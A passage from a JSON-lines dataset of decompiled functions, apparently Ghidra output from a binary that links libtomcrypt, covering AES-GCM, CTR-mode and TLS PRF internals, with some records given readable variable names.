*)(context + 0x10b0 + index) ^= *(byte *)(context + 0x10e0 + index);\n                        index++; \n                    } while (index != 0x10); \n                    FUN_00423460(context, context + 0x10b0); \n                    *(undefined4 *)(context + 0x10fc) = 0; \n                    *(long *)(context + 0x1100) += 0x80; \n                }\n            }\n        } else {\n            return_value = 10; \n        }\n    } else {\n        return_value = 0x10; \n    }\n    return return_value; \n}"}
{"Function Name": "FUN_004236b0", "Address": "004236b0", "Source Code": "undefined8 FUN_004236b0(long context,long tag,ulong *tag_length)\n{\n    uint value_from_structure; \n    undefined8 return_value; \n    ulong intermediate_value; \n    \n    if (context == 0) {\n        FUN_00410bc0(\"gcm != NULL\",\"libtomcrypt.c\",0x81d3);\n    }\n    \n    if (tag == 0) {\n        FUN_00410bc0(\"tag != NULL\",\"libtomcrypt.c\",0x81d4);\n    }\n    \n    if (tag_length == (ulong *)0x0) {\n        FUN_00410bc0(\"taglen != NULL\",\"libtomcrypt.c\",0x81d5);\n    }\n    \n    \n    value_from_structure = *(uint *)(context + 0x10fc);\n    \n    return_value = (value_from_structure < 0x11) ? 10 : 0x10;\n    \n    if (value_from_structure < 0x11 && *(uint *)(context + 0x10f0) < 0x100 && \n        (&DAT_0065b5c0)[(long)(int)*(uint *)(context + 0x10f0) * 0x16] != 0 && \n        *(int *)(context + 0x10f8) == 2) {\n        \n        \n        if (value_from_structure != 0) {\n            *(long *)(context + 0x1108) += (long)(int)value_from_structure * 8;\n            FUN_00423460(context,context + 0x10b0);\n        }\n        \n        \n        intermediate_value = *(ulong *)(context + 0x1100);\n        *(ulong *)(context + 0x10e0) = \n            (intermediate_value >> 0x38) | ((intermediate_value & 0xff000000000000) >> 0x28) | \n            ((intermediate_value & 0xff0000000000) >> 0x18) | ((intermediate_value & 0xff00000000) >> 8) | \n            ((intermediate_value & 0xff000000) << 8) | ((intermediate_value & 0xff0000) << 0x18) | \n            ((intermediate_value & 0xff00) << 0x28) | (intermediate_value << 0x38);\n        \n        \n        intermediate_value = *(ulong *)(context + 0x1108);\n        *(ulong *)(context + 0x10e8) = \n            (intermediate_value >> 0x38) | ((intermediate_value & 0xff000000000000) >> 0x28) | \n            ((intermediate_value & 0xff0000000000) >> 0x18) | ((intermediate_value & 0xff00000000) >> 8) | \n            ((intermediate_value & 0xff000000) << 8) | ((intermediate_value & 0xff0000) << 0x18) | \n            ((intermediate_value & 0xff00) << 0x28) | (intermediate_value << 0x38);\n        \n        \n        for (long index = 0; index < 0x10; index++) {\n            *(byte *)(context + 0x10b0 + index) ^= *(byte *)(context + 0x10e0 + index);\n        }\n        \n        \n        FUN_00423460(context,context + 0x10b0);\n        \n        return_value = (**(code **)(&DAT_0065b5e8 + (long)*(int *)(context + 0x10f0) * 0xb0))\n            (context + 0x10d0,(ulong *)(context + 0x10e0),context);\n        \n        \n        if ((int)return_value == 0) {\n            intermediate_value = 0;\n            \n            while (intermediate_value < *tag_length && intermediate_value < 0x10) {\n                *(byte *)(tag + intermediate_value) = \n                    *(byte *)(context + 0x10b0 + intermediate_value) ^ *(byte *)(context + 0x10e0 + intermediate_value);\n                intermediate_value++;\n            }\n            *tag_length = intermediate_value; \n            \n            (**(code **)(&DAT_0065b600 + (long)*(int *)(context + 0x10f0) * 0xb0))(context);\n            return_value = 0; \n        }\n    }\n    return return_value; \n}"}
{"Function Name": "FUN_004238a0", "Address": "004238a0", "Source Code": "ulong FUN_004238a0(long param_1,ulong *param_2,ulong param_3,ulong *param_4,int param_5)\n{\nbyte *pbVar1;\nint iVar2;\nuint uVar3;\nlong lVar4;\nulong uVar5;\nchar cVar6;\nbyte bVar7;\nulong *puVar8;\nulong *puVar9;\nulong uVar10;\nlong lVar11;\nulong *puVar12;\nulong *puVar13;\nif (param_1 == 0) {\nFUN_00410bc0(\"gcm != NULL\",\"libtomcrypt.c\",0x829a);\n}\nif (param_3 != 0) {\nif (param_2 == (ulong *)0x0) {\nFUN_00410bc0(\"pt != NULL\",\"libtomcrypt.c\",0x829c);\n}\nif (param_4 == (ulong *)0x0) {\nFUN_00410bc0(\"ct != NULL\",\"libtomcrypt.c\",0x829d);\n}\n}\nuVar3 = *(uint *)(param_1 + 0x10fc);\nif (0x10 < uVar3) {\nreturn 0x10;\n}\nlVar11 = (long)(int)*(uint *)(param_1 + 0x10f0);\nif (0xff < *(uint *)(param_1 + 0x10f0)) {\nreturn 10;\n}\nif ((&DAT_0065b5c0)[lVar11 * 0x16] == 0) {\nreturn 10;\n}\nif (*(int *)(param_1 + 0x10f8) == 1) {\nif (uVar3 != 0) {\n*(long *)(param_1 + 0x1100) = *(long *)(param_1 + 0x1100) + (long)(int)uVar3 * 8;\nFUN_00423460(param_1,param_1 + 0x10b0);\nlVar11 = (long)*(int *)(param_1 + 0x10f0);\n}\nlVar4 = 0;\ndo {\ncVar6 = *(char *)(param_1 + 0x10cf + lVar4) + '\\x01';\n*(char *)(param_1 + 0x10cf + lVar4) = cVar6;\nif (cVar6 != '\\0') break;\nlVar4 = lVar4 + -1;\n} while (lVar4 != -4);\nuVar10 = (**(code **)(&DAT_0065b5e8 + lVar11 * 0xb0))(param_1 + 0x10c0,param_1 + 0x10e0,param_1)\n;\nif ((int)uVar10 != 0) {\nreturn uVar10;\n}\n*(undefined4 *)(param_1 + 0x10fc) = 0;\n*(undefined4 *)(param_1 + 0x10f8) = 2;\n}\nelse {\nif (*(int *)(param_1 + 0x10f8) != 2) {\nreturn 0x10;\n}\nuVar10 = 0;\nif (uVar3 != 0) goto LAB_00423b08;\n}\nif (param_5 == 0) {\nif ((param_3 & 0xfffffffffffffff0) != 0) {\nuVar10 = 0;\npuVar9 = param_2;\npuVar13 = param_4;\ndo {\nuVar5 = *puVar9 ^ *(ulong *)(param_1 + 0x10e0);\n*puVar13 = uVar5;\n*(ulong *)(param_1 + 0x10b0) = *(ulong *)(param_1 + 0x10b0) ^ uVar5;\nuVar5 = puVar9[1] ^ *(ulong *)(param_1 + 0x10e8);\npuVar13[1] = uVar5;\n*(long *)(param_1 + 0x1108) = *(long *)(param_1 + 0x1108) + 0x80;\n*(ulong *)(param_1 + 0x10b8) = *(ulong *)(param_1 + 0x10b8) ^ uVar5;\nFUN_00423460(param_1,param_1 + 0x10b0);\nlVar11 = 0;\ndo {\ncVar6 = *(char *)(param_1 + 0x10cf + lVar11) + '\\x01';\n*(char *)(param_1 + 0x10cf + lVar11) = cVar6;\nif (cVar6 != '\\0') break;\nlVar11 = lVar11 + -1;\n} while (lVar11 != -4);\nuVar5 = (**(code **)(&DAT_0065b5e8 + (long)*(int *)(param_1 + 0x10f0) * 0xb0))\n(param_1 + 0x10c0,param_1 + 0x10e0,param_1);\nif ((int)uVar5 != 0) {\nreturn uVar5;\n}\nuVar10 = uVar10 + 0x10;\npuVar9 = puVar9 + 2;\npuVar13 = puVar13 + 2;\n} while (uVar10 < (param_3 & 0xfffffffffffffff0));\ngoto LAB_00423b08;\n}\n}\nelse if ((param_3 & 0xfffffffffffffff0) != 0) {\nuVar10 = 0;\npuVar9 = param_4;\ndo {\nlVar11 = 0;\npuVar8 = (ulong *)(param_1 + 0x10b0);\npuVar12 = (ulong *)(param_1 + 0x10b8);\npuVar13 = (ulong *)(param_1 + 0x10e0);\nwhile( true ) {\n*puVar8 = *puVar8 ^ *(ulong *)((long)puVar9 + lVar11);\n*(ulong *)((long)param_2 + lVar11 + uVar10) = *(ulong *)((long)puVar9 + lVar11) ^ *puVar13;\nlVar11 = lVar11 + 8;\nif (lVar11 == 0x10) break;\npuVar13 = puVar12 + 6;\npuVar8 = puVar12;\npuVar12 = puVar12 + 1;\n}\n*(long *)(param_1 + 0x1108) = *(long *)(param_1 + 0x1108) + 0x80;\nFUN_00423460(param_1,(ulong *)(param_1 + 0x10b0));\nlVar11 = 0;\ndo {\ncVar6 = *(char *)(param_1 + 0x10cf + lVar11) + '\\x01';\n*(char *)(param_1 + 0x10cf + lVar11) = cVar6;\nif (cVar6 != '\\0') break;\nlVar11 = lVar11 + -1;\n} while (lVar11 != -4);\nuVar5 = (**(code **)(&DAT_0065b5e8 + (long)*(int *)(param_1 + 0x10f0) * 0xb0))\n(param_1 + 0x10c0,(ulong *)(param_1 + 0x10e0),param_1);\nif ((int)uVar5 != 0) {\nreturn uVar5;\n}\nuVar10 = uVar10 + 0x10;\npuVar9 = puVar9 + 2;\n} while (uVar10 < (param_3 & 0xfffffffffffffff0));\ngoto LAB_00423b08;\n}\nuVar10 = 0;\nLAB_00423b08:\nif (uVar10 < param_3) {\nuVar3 = *(uint *)(param_1 + 0x10fc);\ndo {\nuVar5 = (ulong)uVar3;\nif (uVar3 == 0x10) {\n*(long *)(param_1 + 0x1108) = *(long *)(param_1 + 0x1108) + 0x80;\nFUN_00423460(param_1,param_1 + 0x10b0);\nlVar11 = 0;\ndo {\ncVar6 = *(char *)(param_1 + 0x10cf + lVar11) + '\\x01';\n*(char *)(param_1 + 0x10cf + lVar11) = cVar6;\nif (cVar6 != '\\0') break;\nlVar11 = lVar11 + -1;\n} while (lVar11 != -4);\nuVar5 = (**(code **)(&DAT_0065b5e8 + (long)*(int *)(param_1 + 0x10f0) * 0xb0))\n(param_1 + 0x10c0,param_1 + 0x10e0,param_1);\nif ((int)uVar5 != 0) {\nreturn uVar5;\n}\n*(undefined4 *)(param_1 + 0x10fc) = 0;\n}\nif (param_5 == 0) {\nbVar7 = *(byte *)(param_1 + 0x10e0 + (long)(int)uVar5) ^ *(byte *)((long)param_2 + uVar10);\n*(byte *)((long)param_4 + uVar10) = bVar7;\n}\nelse {\nbVar7 = *(byte *)((long)param_4 + uVar10);\n*(byte *)((long)param_2 + uVar10) = bVar7 ^ *(byte *)(param_1 + 0x10e0 + (long)(int)uVar5);\n}\niVar2 = *(int *)(param_1 + 0x10fc);\nuVar10 = uVar10 + 1;\nuVar3 = iVar2 + 1;\n*(uint *)(param_1 + 0x10fc) = uVar3;\npbVar1 = (byte *)(param_1 + 0x10b0 + (long)iVar2);\n*pbVar1 = *pbVar1 ^ bVar7;\n} while (uVar10 < param_3);\n}\nreturn 0;\n}\nLocal Variable: local_3c : undefined4\nLocal Variable: local_48 : undefined8\nLocal Variable: local_50 : undefined8\nLocal Variable: local_58 : undefined8\nLocal Variable: local_60 : undefined8\nLocal Variable: local_68 : undefined8"}
{"Function Name": "FUN_004240f0", "Address": "004240f0", "Source Code": "undefined8 FUN_004240f0(long gcm,uint key_index,long key,undefined4 additional_data)\n{\n    undefined8 return_value; \n    long temp_var; \n    int loop_counter; \n    byte *byte_pointer; \n    long outer_loop_counter; \n    long inner_loop_counter; \n    undefined local_buffer[24]; \n    \n    if (gcm == 0) {\n        FUN_00410bc0(\"gcm != NULL\",\"libtomcrypt.c\",0x822c);\n    }\n    \n    if (key == 0) {\n        FUN_00410bc0(\"key != NULL\",\"libtomcrypt.c\",0x822d);\n    }\n    \n    return_value = 10; \n    \n    if ((key_index < 0x100) && (temp_var = (long)(int)key_index, (&DAT_0065b5c0)[temp_var * 0x16] != 0) &&\n        (&DAT_0065b5d4)[temp_var * 0x2c] == 0x10) {\n        \n        \n        return_value = (**(code **)(&DAT_0065b5e0 + temp_var * 0xb0))(key,additional_data,0,gcm);\n        \n        \n        if ((int)return_value == 0) {\n            FUN_004205c0(local_buffer,0x10); \n            \n            return_value = (**(code **)(&DAT_0065b5e8 + temp_var * 0xb0))(local_buffer,gcm + 0x10a0,gcm);\n            \n            \n            if ((int)return_value == 0) {\n                loop_counter = 0; \n                FUN_004205c0(gcm + 0x10e0,0x10); \n                FUN_004205c0(gcm + 0x10b0,0x10); \n                *(uint *)(gcm + 0x10f0) = key_index; \n                *(undefined4 *)(gcm + 0x10f8) = 0; \n                *(undefined4 *)(gcm + 0x10f4) = 0; \n                *(undefined8 *)(gcm + 0x1100) = 0; \n                *(undefined8 *)(gcm + 0x1108) = 0; \n                FUN_004205c0(local_buffer,0x10); \n                temp_var = gcm + 0x1110; \n                \n                \n                do {\n                    local_buffer[0] = (undefined)loop_counter; \n                    loop_counter++; \n                    FUN_00423de0(gcm + 0x10a0,local_buffer,temp_var); \n                    temp_var += 0x10; \n                } while (loop_counter != 0x100); \n                \n                inner_loop_counter = 1; \n                temp_var = 0; \n                outer_loop_counter = 0; \n                \n                \n                do {\n                    byte_pointer = (byte *)(gcm + 0x2111 + temp_var); \n                    long offset = (outer_loop_counter - inner_loop_counter) * 0x1000; \n                    \n                    do {\n                        byte byte_value = byte_pointer[-0xff2]; \n                        byte *manipulation_pointer = byte_pointer + offset + 0xd; \n                        \n                        do {\n                            manipulation_pointer[-1 + inner_loop_counter * 0x1000 + (1 - temp_var)] = *manipulation_pointer; \n                            manipulation_pointer--; \n                        } while (manipulation_pointer != byte_pointer + offset - 2); \n                        byte_pointer[-1] = (&DAT_00438d80)[(int)((uint)byte_value * 2)]; \n                        *byte_pointer ^= (&DAT_00438d80)[(int)((uint)byte_value * 2 + 1)]; \n                        byte_pointer += 0x10; \n                    } while ((byte *)(gcm + 0x3111 + temp_var) != byte_pointer); \n                    outer_loop_counter++; \n                    temp_var += 0x1000; \n                    inner_loop_counter++; \n                } while (outer_loop_counter != 0xf); \n                return_value = 0; \n            }\n        }\n    }\n    return return_value; \n}"}
{"Function Name": "FUN_00424350", "Address": "00424350", "Source Code": "undefined4 FUN_00424350(long input_pointer, ulong *data_pointer, ulong data_length)\n{\n    byte *byte_pointer; \n    uint value_32bit; \n    undefined4 return_value; \n    ulong value_64bit_1; \n    ulong value_64bit_2; \n    undefined8 *pointer_64bit_1; \n    ulong *pointer_64bit_2; \n    \n    if (input_pointer == 0) {\n        FUN_00410bc0(\"gcm != NULL\", \"libtomcrypt.c\", 0x844d);\n    }\n    \n    if ((data_length != 0) && (data_pointer == (ulong *)0x0)) {\n        FUN_00410bc0(\"adata != NULL\", \"libtomcrypt.c\", 0x844f);\n    }\n    \n    value_32bit = *(uint *)(input_pointer + 0x10fc);\n    \n    if (value_32bit < 0x11) {\n        \n        if ((0xff < *(uint *)(input_pointer + 0x10f0)) || \n            (&DAT_0065b5c0)[(long)(int)*(uint *)(input_pointer + 0x10f0) * 0x16] == 0) {\n            return 10; \n        }\n        \n        if (*(int *)(input_pointer + 0x10f8) == 0) {\n            \n            if ((*(int *)(input_pointer + 0x10f4) == 0) && (value_32bit == 0xc)) {\n                \n                *(undefined *)(input_pointer + 0x10cc) = 0;\n                *(undefined *)(input_pointer + 0x10cd) = 0;\n                *(undefined *)(input_pointer + 0x10ce) = 0;\n                *(undefined *)(input_pointer + 0x10cf) = 1;\n                \n                *(undefined8 *)(input_pointer + 0x10c0) = *(undefined8 *)(input_pointer + 0x10e0);\n                *(undefined4 *)(input_pointer + 0x10c8) = *(undefined4 *)(input_pointer + 0x10e8);\n            } else {\n                \n                value_64bit_2 = (ulong)(int)value_32bit;\n                \n                if (value_64bit_2 != 0) {\n                    for (ulong value_64bit_1 = 0; value_64bit_1 < value_64bit_2; value_64bit_1++) {\n                        byte_pointer = (byte *)(input_pointer + 0x10b0 + value_64bit_1); \n                        *byte_pointer = *byte_pointer ^ *(byte *)(input_pointer + 0x10e0 + value_64bit_1); \n                    }\n                }\n                \n                if (value_32bit != 0) {\n                    *(long *)(input_pointer + 0x1100) += value_64bit_2 * 8; \n                    FUN_00423460(input_pointer, input_pointer + 0x10b0); \n                }\n                pointer_64bit_1 = (undefined8 *)(input_pointer + 0x10b0); \n                FUN_004205c0(input_pointer + 0x10e0, 8); \n                value_64bit_1 = *(ulong *)(input_pointer + 0x1100); \n                \n                *(ulong *)(input_pointer + 0x10e8) =\n                    value_64bit_1 >> 0x38 | (value_64bit_1 & 0xff000000000000) >> 0x28 | (value_64bit_1 & 0xff0000000000) >> 0x18 |\n                    (value_64bit_1 & 0xff00000000) >> 8 | (value_64bit_1 & 0xff000000) << 8 | (value_64bit_1 & 0xff0000) << 0x18 |\n                    (value_64bit_1 & 0xff00) << 0x28 | value_64bit_1 << 0x38;\n                \n                for (long loop_index = 0; loop_index < 0x10; loop_index++) {\n                    byte_pointer = (byte *)(input_pointer + 0x10b0 + loop_index); \n                    *byte_pointer = *byte_pointer ^ *(byte *)(input_pointer + 0x10e0 + loop_index); \n                }\n                FUN_00423460(input_pointer, pointer_64bit_1); \n                *(undefined8 *)(input_pointer + 0x10c0) = *pointer_64bit_1; \n                *(undefined8 *)(input_pointer + 0x10c8) = *(undefined8 *)(input_pointer + 0x10b8); \n                FUN_004205c0(pointer_64bit_1, 0x10); \n            }\n            \n            *(undefined8 *)(input_pointer + 0x10d0) = *(undefined8 *)(input_pointer + 0x10c0);\n            *(undefined8 *)(input_pointer + 0x10d8) = *(undefined8 *)(input_pointer + 0x10c8);\n            FUN_004205c0(input_pointer + 0x10e0, 0x10); \n            *(undefined4 *)(input_pointer + 0x10fc) = 0; \n            *(undefined8 *)(input_pointer + 0x1100) = 0; \n            *(undefined4 *)(input_pointer + 0x10f8) = 1; \n        LAB_004244e3:\n            \n            if ((data_length & 0xfffffffffffffff0) == 0) {\n                value_64bit_1 = 0; \n            } else {\n                pointer_64bit_2 = data_pointer; \n                \n                for (value_64bit_1 = 0; value_64bit_1 < (data_length & 0xfffffffffffffff0); value_64bit_1 += 0x10) {\n                    *(ulong *)(input_pointer + 0x10b0) ^= *pointer_64bit_2; \n                    *(ulong *)(input_pointer + 0x10b8) ^= pointer_64bit_2[1]; \n                    FUN_00423460(input_pointer, input_pointer + 0x10b0); \n                    *(long *)(input_pointer + 0x1100) += 0x80; \n                    pointer_64bit_2 += 2; \n                }\n            }\n            data_pointer = (ulong *)((long)data_pointer + value_64bit_1); \n        } else {\n            \n            if (*(int *)(input_pointer + 0x10f8) != 1) goto LAB_00424389;\n            \n            if (value_32bit == 0x10) {\n                return 0x10; \n            }\n            value_64bit_1 = 0; \n            \n            if (value_32bit == 0) goto LAB_004244e3;\n        }\n        \n        for (value_64bit_2 = value_64bit_1; value_64bit_2 < data_length; value_64bit_2++) {\n            int increment_value = *(int *)(input_pointer + 0x10fc); \n            *(int *)(input_pointer + 0x10fc) = increment_value + 1; \n            byte_pointer = (byte *)(input_pointer + 0x10b0 + (long)increment_value); \n            *byte_pointer = *byte_pointer ^ *(byte *)((long)data_pointer + (value_64bit_2 - value_64bit_1)); \n            \n            if (*(int *)(input_pointer + 0x10fc) == 0x10) {\n                FUN_00423460(input_pointer, input_pointer + 0x10b0); \n                *(undefined4 *)(input_pointer + 0x10fc) = 0; \n                *(long *)(input_pointer + 0x1100) += 0x80; \n            }\n        }\n        return_value = 0; \n    } else {\n    LAB_00424389:\n        return_value = 0x10; \n    }\n    return return_value; \n}"}
{"Function Name": "FUN_00424730", "Address": "00424730", "Source Code": "int FUN_00424730(byte *input_data, byte *output_data, ulong data_length, uint *control_array)\n{\n    uint control_value = *control_array; \n    int return_value = 10; \n    if (input_data == (byte *)0x0) { \n        FUN_00410bc0(\"pt != NULL\", \"libtomcrypt.c\", 0x8663); \n    }\n    if (output_data == (byte *)0x0) { \n        FUN_00410bc0(\"ct != NULL\", \"libtomcrypt.c\", 0x8664); \n    }\n    if (control_array == (uint *)0x0) { \n        FUN_00410bc0(\"ctr != NULL\", \"libtomcrypt.c\", 0x8665); \n    }\n    if ((control_value < 0x100) && ((&DAT_0065b5c0)[(long)(int)control_value * 0x16] != 0)) { \n        uint second_control_value = control_array[1]; \n        return_value = 0x10; \n        if ((second_control_value - 1 < 0x80) && (control_array[2] < 0x81)) { \n            if ((second_control_value & 7) == 0) { \n                if ((second_control_value == control_array[2]) && \n                    (*(code **)(&DAT_0065b630 + (long)(int)control_value * 0xb0) != (code *)0x0) && \n                    ((ulong)(long)(int)second_control_value <= data_length)) { \n                    return_value = (**(code **)(&DAT_0065b630 + (long)(int)control_value * 0xb0)) \n                        (input_data, output_data, data_length / (ulong)(long)(int)second_control_value, control_array + 5, \n                        control_array[3], control_array + 0x46);\n                    if (return_value != 0) { \n                        return return_value; \n                    }\n                    data_length = data_length % (ulong)(long)(int)second_control_value; \n                }\n                return_value = 0; \n                if (data_length != 0) { \n                    do {\n                        uint control_value = control_array[2]; \n                        long temp_value = (long)(int)control_value; \n                        if (control_value == second_control_value) { \n                            if (control_array[3] == 0) { \n                                control_value = control_array[4]; \n                                if (0 < (int)control_value) { \n                                    control_array[5]++; \n                                    if (control_array[5] == 0) { \n                                        char *byte_pointer = (char *)((long)control_array + 0x15); \n                                        do {\n                                            if (byte_pointer == (char *)((long)control_array + (ulong)(control_value - 1) + 0x15)) break; \n                                            *byte_pointer += 1; \n                                            byte_pointer++; \n                                        } while (*byte_pointer == '\\0'); \n                                    }\n                                }\n                            }\n                        } else { \n                            control_value = control_array[4]; \n                            do {\n                                second_control_value--; \n                                if ((int)second_control_value < (int)control_value) break; \n                                *((char *)control_array + (long)(int)second_control_value + 0x14) += 1; \n                            } while (*((char *)control_array + (long)(int)second_control_value + 0x14) == '\\0'); \n                        }\n                        return_value = (**(code **)(&DAT_0065b5e8 + (long)(int)*control_array * 0xb0)) \n                            (control_array + 5, control_array + 0x25, control_array + 0x46);\n                        if (return_value != 0) { \n                            return return_value; \n                        }\n                        second_control_value = control_array[1]; \n                        control_array[2] = 0; \n                        if (data_length < (ulong)(int)second_control_value) { \n                            temp_value = 0; \n                            goto LAB_00424868; \n                        }\n                        return_value = 0; \n                        if (0 < (int)second_control_value) { \n                            do {\n                                *(ulong *)(output_data + return_value) = \n                                    *(ulong *)(input_data + return_value) ^ *(ulong *)((long)control_array + return_value + 0x94);\n                                return_value += 8; \n                            } while (return_value < (int)second_control_value); \n                        }\n                        input_data += (ulong)(int)second_control_value; \n                        output_data += (ulong)(int)second_control_value; \n                        data_length -= (ulong)(int)second_control_value; \n                        control_array[2] = second_control_value; \n                    } while (true); \n                }\n            } else {\n                return_value = 0x10; \n            }\n        }\n    }\n    return return_value; \n}"}
{"Function Name": "FUN_00424b00", "Address": "00424b00", "Source Code": "undefined8\nFUN_00424b00(uint input_value,long iv_pointer,long key_pointer,undefined4 param_a,undefined4 param_b,\nuint flag_value,uint *ctr_array)\n{\n    uint data_value; \n    undefined8 return_value; \n    long loop_counter; \n    char temp_char; \n    uint extracted_value; \n    \n    if (iv_pointer == 0) {\n        FUN_00410bc0(\"IV != NULL\",\"libtomcrypt.c\",0x872e);\n    }\n    \n    if (key_pointer == 0) {\n        FUN_00410bc0(\"key != NULL\",\"libtomcrypt.c\",0x872f);\n    }\n    \n    if (ctr_array == (uint *)0x0) {\n        FUN_00410bc0(\"ctr != NULL\",\"libtomcrypt.c\",0x8730);\n    }\n    \n    if ((input_value < 0x100) && (&DAT_0065b5c0)[(long)(int)input_value * 0x16] != 0) {\n        extracted_value = flag_value & 0xff; \n        if (extracted_value == 0) {\n            data_value = (&DAT_0065b5d4)[(long)(int)input_value * 0x2c]; \n            ctr_array[4] = data_value; \n            extracted_value = data_value; \n        } else {\n            data_value = (&DAT_0065b5d4)[(long)(int)input_value * 0x2c]; \n            ctr_array[4] = extracted_value; \n            \n            if ((int)data_value < (int)extracted_value) {\n                return 0x10; \n            }\n        }\n        \n        if ((flag_value & 0x1000) != 0) {\n            ctr_array[4] = data_value - extracted_value; \n        }\n        \n        return_value = (**(code **)(&DAT_0065b5e0 + (long)(int)input_value * 0xb0))(key_pointer,param_a,param_b,ctr_array + 0x46);\n        \n        if ((int)return_value == 0) {\n            extracted_value = (&DAT_0065b5d4)[(long)(int)input_value * 0x2c]; \n            *ctr_array = input_value; \n            ctr_array[2] = 0; \n            ctr_array[3] = flag_value & 0x1000; \n            ctr_array[1] = extracted_value; \n            \n            if (0 < (int)extracted_value) {\n                loop_counter = 0; \n                do {\n                    *(undefined *)((long)ctr_array + loop_counter + 0x14) = *(undefined *)(iv_pointer + loop_counter); \n                    loop_counter++; \n                } while (loop_counter != (ulong)(extracted_value - 1) + 1); \n            }\n            \n            if ((flag_value & 0x2000) != 0) {\n                \n                if ((flag_value & 0x1000) == 0) {\n                    extracted_value = ctr_array[4]; \n                    \n                    if (0 < (int)extracted_value) {\n                        ctr_array[5]++; \n                        \n                        if (ctr_array[5] == 0) {\n                            char *pcVar6 = (char *)((long)ctr_array + 0x15); \n                            do {\n                                \n                                if (pcVar6 == (char *)((long)ctr_array + (ulong)(extracted_value - 1) + 0x15)) break;\n                                temp_char = *pcVar6; \n                                *pcVar6 = temp_char + '\\x01'; \n                                pcVar6++; \n                            } while ((char)(temp_char + '\\x01') == '\\0'); \n                        }\n                    }\n                }\n            } else {\n                data_value = ctr_array[4]; \n                do {\n                    extracted_value--; \n                    \n                    if ((int)extracted_value < (int)data_value) break;\n                    temp_char = *(char *)((long)ctr_array + (long)(int)extracted_value + 0x14) + '\\x01'; \n                    *(char *)((long)ctr_array + (long)(int)extracted_value + 0x14) = temp_char; \n                } while (temp_char == '\\0'); \n            }\n            \n            return_value = (**(code **)(&DAT_0065b5e8 + (long)(int)input_value * 0xb0))(ctr_array + 5,ctr_array + 0x25,ctr_array + 0x46);\n            return return_value; \n        }\n    } \n    return 10; \n}"}
{"Function Name": "FUN_00424d90", "Address": "00424d90", "Source Code": "undefined8 FUN_00424d90(void *input_pointer, size_t input_size, uint *control_array)\n{\n    \n    if (input_pointer == (void *)0x0) {\n        \n        FUN_00410bc0(\"IV != NULL\", \"libtomcrypt.c\", 0x878a);\n    }\n    \n    \n    if (control_array == (uint *)0x0) {\n        \n        FUN_00410bc0(\"ctr != NULL\", \"libtomcrypt.c\", 0x878b);\n    }\n    \n    \n    if ((*control_array < 0x100) && ((&DAT_0065b5c0)[(long)(int)*control_array * 0x16] != 0)) {\n        \n        if ((long)(int)control_array[1] == input_size) {\n            \n            memcpy(control_array + 5, input_pointer, input_size);\n            \n            control_array[2] = 0;\n            \n            return (**(code **)(&DAT_0065b5e8 + (long)(int)*control_array * 0xb0))(input_pointer, control_array + 0x25, control_array + 0x46);\n        }\n    }\n    \n    \n    return 10;\n}"}
{"Function Name": "FUN_00424e70", "Address": "00424e70", "Source Code": "undefined8 FUN_00424e70(void *iv, ulong *len, long ctr)\n{\n    \n    if (iv == (void *)0x0) {\n        \n        FUN_00410bc0(\"IV != NULL\", \"libtomcrypt.c\", 0x87c0);\n    }\n    \n    \n    if (len == (ulong *)0x0) {\n        \n        FUN_00410bc0(\"len != NULL\", \"libtomcrypt.c\", 0x87c1);\n    }\n    \n    \n    if (ctr == 0) {\n        \n        FUN_00410bc0(\"ctr != NULL\", \"libtomcrypt.c\", 0x87c2);\n    }\n    \n    \n    size_t size = (size_t)*(int *)(ctr + 4);\n    \n    \n    if (*len < size) {\n        \n        *len = size;\n        \n        return 6;\n    }\n    \n    \n    memcpy(iv, (void *)(ctr + 0x14), size);\n    \n    \n    return 0;\n}"}
{"Function Name": "FUN_00426540", "Address": "00426540", "Source Code": "void FUN_00426540(undefined4 input_param_1, ulong input_param_2, long target_memory, uint byte_count, undefined8 input_param_5,\n                  undefined4 input_param_6, undefined8 input_param_7, undefined4 input_param_8, undefined8 input_param_9,\n                  undefined4 input_param_10, long flag_param_1, int flag_param_2) {\n    byte *current_byte_ptr; \n    long loop_index; \n    ulong remaining_bytes = (ulong)byte_count; \n    ulong processed_bytes = input_param_2; \n    undefined intermediate_buffer[568]; \n    byte processed_data[64]; \n    bool are_flags_non_zero = flag_param_1 != 0 && flag_param_2 != 0; \n    \n    FUN_004227f0(intermediate_buffer, input_param_1, input_param_5, input_param_6);\n    \n    FUN_00422a50(intermediate_buffer, input_param_7, input_param_8);\n    \n    FUN_00422a50(intermediate_buffer, input_param_9, input_param_10);\n    \n    \n    if (are_flags_non_zero) {\n        FUN_00422a50(intermediate_buffer, flag_param_1, flag_param_2);\n    }\n    \n    \n    FUN_00422af0(intermediate_buffer, processed_data, &processed_bytes);\n    \n    while (remaining_bytes != 0) {\n        \n        FUN_004227f0(intermediate_buffer, input_param_1, input_param_5, input_param_6);\n        \n        FUN_00422a50(intermediate_buffer, processed_data, processed_bytes);\n        \n        FUN_00422a50(intermediate_buffer, input_param_7, input_param_8);\n        \n        FUN_00422a50(intermediate_buffer, input_param_9, input_param_10);\n        \n        \n        if (are_flags_non_zero) {\n            FUN_00422a50(intermediate_buffer, flag_param_1, flag_param_2);\n        }\n        \n        \n        FUN_00422af0(intermediate_buffer, processed_data, &processed_bytes);\n        \n        \n        int bytes_to_xor = (int)(remaining_bytes <= processed_bytes ? remaining_bytes : processed_bytes);\n        if (bytes_to_xor != 0) {\n            \n            for (long loop_index = 0; loop_index < bytes_to_xor; loop_index++) {\n                current_byte_ptr = (byte *)(target_memory + loop_index); \n                *current_byte_ptr ^= processed_data[loop_index]; \n            }\n            target_memory += bytes_to_xor; \n            remaining_bytes -= bytes_to_xor; \n        }\n    }\n}"}
{"Function Name": "FUN_00426a30", "Address": "00426a30", "Source Code": "void FUN_00426a30(long input_ptr, void *output_buffer, uint byte_count, long hash_param1, int hash_param2,\nundefined8 extra_param1, undefined4 extra_param2, undefined8 extra_param3, undefined4 extra_param4,\nlong optional_param1, int optional_param2)\n{\n    bool is_valid; \n    int return_value; \n    undefined4 hash_algorithm; \n    long loop_index; \n    ulong remaining_bytes = (ulong)byte_count; \n    uint half_param5; \n    int bytes_to_copy; \n    ulong remaining_bytes_after_half; \n    ulong buffer_size = 0x20; \n    undefined intermediate_buffer[568]; \n    undefined output_buffer_final[64]; \n    undefined additional_output_buffer[64]; \n    \n    if ((*(short *)(input_ptr + 100) == -0x103) || (*(short *)(input_ptr + 100) == 0x303)) {\n        return_value = FUN_00426920(); \n        \n        hash_algorithm = (return_value == 0x30) ? FUN_00414210(\"sha384\") : FUN_00414210(\"sha256\");\n        FUN_004227f0(intermediate_buffer, hash_algorithm, hash_param1, hash_param2); \n        FUN_00422a50(intermediate_buffer, extra_param1, extra_param2); \n        